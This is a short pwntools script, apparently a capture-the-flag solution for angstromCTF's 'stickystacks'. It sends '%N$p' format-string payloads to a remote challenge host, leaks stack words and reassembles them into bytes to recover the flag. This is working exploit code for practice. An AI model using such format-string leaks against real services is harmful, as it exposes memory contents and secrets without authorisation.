#!/usr/bin/python3

from pwn import *
import sys

if len(sys.argv) > 1:
    r = remote('shell.actf.co', 21820)
else:
    r = process('./stickystacks')

s = b''
for i in range(25, 70):
    r = remote('shell.actf.co', 21820)
    r.sendline(f'%{i}$p')
    r.recvuntil('Welcome')
    s += r.recvline()[:-1]
    r.close()

print(s)
s = s.replace(b'(nil), ', b'')
s = s.split(b', ')[1:]

OWO = b''
for ss in s:
    if len(ss) == 2+16:
        a = ss.decode()[2:]
        a = int(a, 16)
        OWO += p64(a)

print(OWO)
#r.interactive()
